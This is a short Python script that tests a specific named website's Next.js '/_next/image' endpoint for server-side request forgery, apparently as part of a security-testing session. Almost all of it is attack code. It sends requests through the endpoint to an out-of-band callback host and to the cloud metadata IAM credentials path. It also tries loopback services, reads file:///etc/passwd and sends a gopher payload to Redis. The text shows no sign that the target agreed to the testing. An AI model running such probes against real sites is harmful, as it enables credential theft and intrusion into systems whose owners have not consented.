import re, urllib.parse, subprocess, os
W='/work/tool_outputs/'
h=open('/work/t_home.html',encoding='utf8',errors='ignore').read()
imgs=sorted(set(re.findall(r'https://[a-z0-9.\-]*assets\.net/[^"\'<>\\ ]{5,200}', h)))
print("imgs found:", len(imgs))
base=imgs[0]
print("base host:", base.split('/')[2])
enc=urllib.parse.quote(base, safe='')
open(W+'w20_enc.txt','w').write(enc)
OOB='oob0b88562fcccf.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in'
OOB2='ooba12d9b3298d0.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in'
ROOT='https://www.infinitycapital.bh'

def get(url,out,timeout=25):
    cmd=['curl','-s','--max-time',str(timeout),'-o',out,'-D',out+'.h','-w','%{http_code} %{size_download} %{content_type}']
    cmd.append(url)
    r=subprocess.run(cmd,capture_output=True,text=True)
    return r.stdout.strip()

def nimg(name, rawurl, extra='&w=1080&q=75'):
    e=urllib.parse.quote(rawurl, safe='')
    u=f'{ROOT}/_next/image?url={e}{extra}'
    res=get(u, W+name)
    print(f'{name:22s} {res}')
    return res

print('\n=== A. legit baseline ===')
nimg('w20_legit.bin', base)

print('\n=== B. SSRF to OOB host (arbitrary external) ===')
nimg('w20_oob.bin', 'http://'+OOB+'/ssrf-img')

print('\n=== C. SSRF to cloud metadata ===')
nimg('w20_meta.bin', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')

print('\n=== D. SSRF loopback / internal ===')
nimg('w20_local.bin', 'http://127.0.0.1:3000/')
nimg('w20_l2.bin', 'http://localhost:8080/')

print('\n=== E. file:// scheme ===')
nimg('w20_file.bin', 'file:///etc/passwd')

print('\n=== F. gopher/dict ===')
nimg('w20_gopher.bin', 'gopher://127.0.0.1:6379/_INFO')
